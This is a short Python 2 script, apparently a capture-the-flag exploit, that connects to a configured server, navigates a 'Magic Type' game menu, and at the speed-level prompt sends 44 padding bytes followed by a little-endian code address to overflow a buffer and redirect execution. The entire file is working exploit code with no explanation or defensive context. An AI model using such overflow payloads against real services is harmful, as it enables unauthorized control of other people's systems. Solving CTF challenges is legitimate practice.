import socket
import config

def main():
    playing = True
    is_game_over = False
    lastScore = 0

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = (config.HOST, config.PORT)
    print 'connecting to %s port %s' % server_address
    sock.connect(server_address)

    while True:
        data = sock.recv(1024)
        if data:
            print data
        if '=====Magic Type Menu=====' in data and playing:
            print "[*] Play a game!"
            sock.sendall('1\r\n')
        if 'Choose the speed level' in data and playing:
            print "[*] Choose speed level at " + str(config.LEVEL) + '!'
            leakstring =  'a' * 44 + '\xcd\x88\x04\x08\r\n'
            print '[*] Send a leak string to server', repr(leakstring)
            sock.sendall(leakstring)

    print 'Close the socket!'
    sock.close()

if __name__ == '__main__':
    main()
